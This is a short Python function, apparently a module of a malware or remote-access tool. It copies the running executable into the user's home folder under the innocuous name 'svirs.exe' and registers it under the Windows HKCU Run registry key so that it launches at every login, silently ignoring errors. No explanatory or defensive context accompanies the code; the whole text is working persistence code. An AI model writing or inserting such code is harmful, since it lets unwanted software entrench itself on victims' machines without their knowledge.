def main(state, name_key="svirs"):
    import shutil
    import winreg
    import os

    save_loc = os.path.join(state["home_dir"], name_key + ".exe")
    try:
        shutil.copy2(state["exe_fn"], save_loc)
    except:
        pass
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, name_key, 0, winreg.REG_SZ, save_loc)
    state["result"] = save_loc